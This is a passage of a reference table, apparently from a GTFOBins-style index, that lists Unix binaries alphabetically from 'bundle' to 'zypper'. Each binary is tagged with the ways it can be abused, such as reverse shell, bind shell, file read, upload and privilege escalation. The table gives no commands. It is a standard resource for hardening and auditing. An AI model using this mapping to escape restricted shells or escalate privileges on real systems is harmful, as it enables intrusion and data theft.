| `bundle` | Inherit, Shell |
| `busctl` | Inherit, Shell |
| `busybox` | Inherit, Reverse shell, Upload |
| `byebug` | Inherit |
| `bzip2` | File read |
| `cabal` | Shell |
| `cancel` | Upload |
| `capsh` | Shell |
| `cargo` | Inherit |
| `cat` | File read |
| `cdist` | Shell |
| `certbot` | Shell |
| `chattr` | Privilege escalation |
| `check_by_ssh` | Shell |
| `check_cups` | File read |
| `check_log` | File read, File write |
| `check_memory` | File read |
| `check_raid` | File read |
| `check_ssl_cert` | Shell |
| `check_statusfile` | File read |
| `chmod` | Privilege escalation |
| `choom` | Shell |
| `chown` | Privilege escalation |
| `chroot` | Shell |
| `chrt` | Shell |
| `clamscan` | File read |
| `clisp` | Shell |
| `cmake` | File read, Shell |
| `cmp` | File read |
| `cobc` | Shell |
| `code` | Download, Reverse shell, Upload |
| `codex` | Shell |
| `column` | File read |
| `comm` | File read |
| `composer` | Shell |
| `cowsay` | Inherit |
| `cowthink` | Inherit |
| `cp` | File read, File write, Privilege escalation |
| `cpan` | Inherit |
| `cpio` | File read, File write, Shell |
| `cpulimit` | Shell |
| `crash` | Command, Inherit |
| `crontab` | Command, Inherit |
| `csh` | File write, Shell |
| `csplit` | File read, File write |
| `csvtool` | File read, File write, Shell |
| `ctr` | Shell |
| `cupsfilter` | File read |
| `curl` | Download, File read, File write, Library load, Upload |
| `cut` | File read |
| `dash` | File write, Shell |
| `date` | File read |
| `dc` | Shell |
| `dd` | File read, File write |
| `debugfs` | Shell |
| `dhclient` | Shell |
| `dialog` | File read |
| `diff` | File read |
| `dig` | File read |
| `distcc` | Shell |
| `dmesg` | File read, Inherit |
| `dmidecode` | File write |
| `dmsetup` | Shell |
| `dnf` | Command |
| `dnsmasq` | Command |
| `doas` | Shell |
| `docker` | File read, File write, Shell |
| `dos2unix` | File read, File write |
| `dosbox` | File read, File write |
| `dotnet` | File read, Shell |
| `dpkg` | Inherit, Shell |
| `dstat` | Inherit |
| `dvips` | Shell |
| `easy_install` | Inherit |
| `easyrsa` | Shell |
| `eb` | Inherit |
| `ed` | File read, File write, Shell |
| `efax` | File read |
| `egrep` | File read |
| `elvish` | File read, File write, Shell |
| `emacs` | File read, File write, Shell |
| `enscript` | Shell |
| `env` | Shell |
| `eqn` | File read |
| `espeak` | File read |
| `ex` | Inherit, Shell |
| `exiftool` | File read, File write, Inherit |
| `expand` | File read |
| `expect` | File read, Shell |
| `facter` | Inherit |
| `fail2ban-client` | Command |
| `fastfetch` | Command, File read, Shell |
| `ffmpeg` | Library load |
| `fgrep` | File read |
| `file` | File read |
| `find` | File read, File write, Shell |
| `finger` | Download, Upload |
| `firejail` | Shell |
| `fish` | Shell |
| `flock` | Shell |
| `fmt` | File read |
| `fold` | File read |
| `forge` | Shell |
| `fping` | File read |
| `ftp` | Download, Shell, Upload |
| `fzf` | Command, Shell |
| `gawk` | Bind shell, File read, File write, Reverse shell, Shell |
| `gcc` | File read, File write, Shell |
| `gcloud` | Inherit |
| `gcore` | File read |
| `gdb` | File write, Inherit, Shell |
| `gem` | Inherit, Shell |
| `genie` | Shell |
| `genisoimage` | File read |
| `getent` | Privilege escalation |
| `ghc` | Shell |
| `ghci` | Shell |
| `gimp` | Inherit |
| `ginsh` | Shell |
| `git` | File read, File write, Inherit, Shell |
| `gnuplot` | Shell |
| `go` | Bind shell, File read, File write, Reverse shell, Shell |
| `grc` | Shell |
| `grep` | File read |
| `gtester` | File write, Shell |
| `guile` | Shell |
| `gzip` | File read |
| `hashcat` | File write |
| `head` | File read |
| `hexdump` | File read |
| `hg` | Shell |
| `highlight` | File read |
| `hping3` | Shell, Upload |
| `iconv` | File read, File write |
| `iftop` | Shell |
| `install` | Privilege escalation |
| `ionice` | Shell |
| `ip` | File read, Shell |
| `iptables-save` | File write |
| `irb` | Inherit |
| `ispell` | Shell |
| `java` | Shell |
| `jjs` | Download, File read, File write, Reverse shell, Shell |
| `joe` | Shell |
| `join` | File read |
| `journalctl` | Inherit |
| `jq` | File read |
| `jrunscript` | Download, File read, File write, Reverse shell, Shell |
| `jshell` | File read, File write, Shell |
| `jtag` | Shell |
| `julia` | Download, File read, File write, Reverse shell, Shell |
| `knife` | Inherit |
| `ksshell` | File read |
| `ksu` | Shell |
| `kubectl` | Shell, Upload |
| `last` | File read |
| `latex` | File read, File write, Shell |
| `latexmk` | File read, Inherit, Shell |
| `ld.so` | Shell |
| `ldconfig` | Library load |
| `less` | Command, File read, File write, Inherit, Shell |
| `lftp` | Shell |
| `links` | File read |
| `ln` | Privilege escalation |
| `loginctl` | Shell |
| `logrotate` | File read, File write, Shell |
| `logsave` | Shell |
| `look` | File read |
| `lp` | Upload |
| `ltrace` | File read, File write, Shell |
| `lua` | Bind shell, Download, File read, File write, Reverse shell, Shell, Upload |
| `lualatex` | Inherit |
| `luatex` | Inherit |
| `lwp-download` | Download, File read, File write |
| `lwp-request` | File read |
| `lxd` | Shell |
| `m4` | Command, File read, Shell |
| `mail` | Shell |
| `make` | File read, File write, Shell |
| `man` | File read, Inherit, Shell |
| `mawk` | File read, File write, Shell |
| `minicom` | Shell |
| `more` | File read, Shell |
| `mosh-server` | Shell |
| `mosquitto` | File read |
| `mount` | Privilege escalation |
| `msfconsole` | Inherit |
| `msgattrib` | File read |
| `msgcat` | File read |
| `msgconv` | File read |
| `msgfilter` | File read, Shell |
| `msgmerge` | File read |
| `msguniq` | File read |
| `mtr` | File read |
| `multitime` | Shell |
| `mutt` | File read |
| `mv` | File write, Privilege escalation |
| `mypy` | File read, File write |
| `mysql` | Library load, Shell |
| `nano` | File read, File write, Shell |
| `nasm` | File read |
| `nc` | Bind shell, Download, Reverse shell, Upload |
| `ncdu` | Shell |
| `ncftp` | Shell |
| `needrestart` | Inherit |
| `neofetch` | File read, Shell |
| `nft` | File read |
| `nginx` | Download, Library load, Upload |
| `nice` | Shell |
| `nl` | File read |
| `nm` | File read |
| `nmap` | File read, File write, Inherit, Shell |
| `node` | Bind shell, Download, File read, File write, Reverse shell, Shell, Upload |
| `nohup` | Command, Shell |
| `npm` | Shell |
| `nroff` | File read, Shell |
| `nsenter` | Shell |
| `ntpdate` | File read |
| `octave` | File read, File write, Shell |
| `od` | File read |
| `opencode` | Command, Inherit |
| `openssl` | Download, File read, File write, Library load, Reverse shell, Upload |
| `openvpn` | File read, Shell |
| `openvt` | Command |
| `opkg` | Shell |
| `pandoc` | File read, File write, Inherit |
| `passwd` | Privilege escalation |
| `paste` | File read |
| `pax` | File read |
| `pdb` | Inherit |
| `pdflatex` | File read, File write, Shell |
| `pdftex` | Shell |
| `perf` | Shell |
| `perl` | Download, File read, Reverse shell, Shell, Upload |
| `perlbug` | Shell |
| `pexec` | Shell |
| `pg` | File read, Shell |
| `php` | Command, Download, File read, File write, Reverse shell, Shell, Upload |
| `pic` | File read, Shell |
| `pidstat` | Shell |
| `pip` | Inherit, Shell |
| `pipx` | Inherit |
| `pkexec` | Shell |
| `pkg` | Command |
| `plymouth` | Shell |
| `podman` | Shell |
| `poetry` | Inherit |
| `posh` | Shell |
| `pr` | File read |
| `procmail` | Command |
| `pry` | Inherit |
| `psftp` | Shell |
| `psql` | Inherit, Shell |
| `ptx` | File read |
| `puppet` | File read, File write, Shell |
| `pwsh` | File write, Shell |
| `pygmentize` | File read |
| `pyright` | File read |
| `python` | Download, File read, File write, Library load, Reverse shell, Shell, Upload |
| `qpdf` | File read |
| `rake` | File read, Inherit |
| `ranger` | Shell |
| `rc` | Shell |
| `readelf` | File read |
| `redcarpet` | File read |
| `redis` | File write |
| `restic` | Command, Shell, Upload |
| `rev` | File read |
| `rlogin` | Upload |
| `rlwrap` | File write, Shell |
| `rpm` | Command, Inherit, Shell |
| `rpmdb` | Inherit, Shell |
| `rpmquery` | Inherit, Shell |
| `rpmverify` | Inherit, Shell |
| `rsync` | Shell |
| `rsyslogd` | Command |
| `rtorrent` | Shell |
| `ruby` | Download, File read, File write, Library load, Reverse shell, Shell, Upload |
| `run-mailcap` | Inherit |
| `run-parts` | Shell |
| `runscript` | Shell |
| `rustc` | File read, File write, Inherit |
| `rustdoc` | File read, File write |
| `rustfmt` | File read |
| `rustup` | Command, Shell |
| `sash` | Shell |
| `scanmem` | Shell |
| `scp` | Download, Shell, Upload |
| `screen` | File write, Shell |
| `script` | File write, Shell |
| `scrot` | Shell |
| `sed` | File read, File write, Shell |
| `service` | Shell |
| `setarch` | Shell |
| `setcap` | Privilege escalation |
| `setfacl` | Privilege escalation |
| `setlock` | Shell |
| `sftp` | Download, Shell, Upload |
| `sg` | Shell |
| `shred` | File write |
| `shuf` | File read, File write |
| `slsh` | Shell |
| `smbclient` | Download, Shell, Upload |
| `snap` | Command |
| `socat` | Bind shell, Download, File read, File write, Reverse shell, Shell, Upload |
| `socket` | Bind shell, Reverse shell |
| `soelim` | File read |
| `softlimit` | Shell |
| `sort` | File read, File write |
| `split` | File read, File write, Shell |
| `sqlite3` | File read, File write, Shell |
| `sqlmap` | Inherit |
| `ss` | File read |
| `ssh` | Download, File read, Shell, Upload |
| `ssh-agent` | Shell |
| `ssh-copy-id` | File read, File write |
| `ssh-keygen` | Library load |
| `ssh-keyscan` | File read |
| `sshfs` | Command, Download, Shell, Upload |
| `sshpass` | Shell |
| `sshuttle` | Shell |
| `start-stop-daemon` | Shell |
| `stdbuf` | Shell |
| `strace` | File write, Shell |
| `strings` | File read |
| `su` | Shell |
| `sudo` | Shell |
| `sysctl` | Command, File read |
| `systemctl` | Inherit, Shell |
| `systemd-resolve` | Inherit |
| `systemd-run` | Command, Shell |
| `tac` | File read |
| `tail` | File read |
| `tailscale` | Upload |
| `tar` | Download, File read, File write, Shell, Upload |
| `task` | Shell |
| `taskset` | Shell |
| `tasksh` | Shell |
| `tbl` | File read |
| `tclsh` | Library load, Reverse shell, Shell |
| `tcpdump` | Command, File write |
| `tcsh` | File write, Shell |
| `tdbtool` | Shell |
| `tee` | File write |
| `telnet` | Reverse shell, Shell |
| `terraform` | File read |
| `tex` | Shell |
| `tftp` | Download, Upload |
| `tic` | File read |
| `time` | Shell |
| `timedatectl` | Inherit |
| `timeout` | Shell |
| `tmate` | Shell |
| `tmux` | File read, Shell |
| `top` | Shell |
| `torify` | Shell |
| `torsocks` | Shell |
| `troff` | File read |
| `tsc` | File read, File write |
| `tshark` | Inherit |
| `ul` | File read |
| `unexpand` | File read |
| `uniq` | File read |
| `unshare` | Shell |
| `unsquashfs` | Privilege escalation |
| `unzip` | Privilege escalation |
| `update-alternatives` | File write |
| `urlget` | File read |
| `uuencode` | File read |
| `uv` | Shell |
| `vagrant` | Inherit |
| `valgrind` | Shell |
| `varnishncsa` | File write |
| `vi` | File read, File write, Shell |
| `vigr` | Inherit |
| `vim` | File read, Inherit |
| `vipw` | Inherit |
| `virsh` | Command, File write |
| `volatility` | Inherit |
| `w3m` | File read |
| `wall` | File read |
| `watch` | Shell |
| `wc` | File read |
| `wg-quick` | Shell |
| `wget` | Download, File read, File write, Shell, Upload |
| `whiptail` | File read |
| `whois` | Download, Upload |
| `wireshark` | File write, Inherit |
| `wish` | Inherit |
| `xargs` | File read, Shell |
| `xdg-user-dir` | Shell |
| `xdotool` | Shell |
| `xmodmap` | File read |
| `xmore` | File read |
| `xpad` | File read |
| `xxd` | File read, File write |
| `xz` | File read |
| `yarn` | Shell |
| `yash` | Shell |
| `yelp` | File read |
| `yt-dlp` | Shell |
| `yum` | Command, Download, Inherit |
| `zathura` | Shell |
| `zcat` | File read |
| `zgrep` | File read |
| `zic` | Command |
| `zip` | File read, Shell |
| `zless` | Inherit |
| `zsh` | Download, File read, File write, Inherit, Reverse shell, Shell, Upload |
| `zsoelim` | File read |
| `zypper` | Shell |
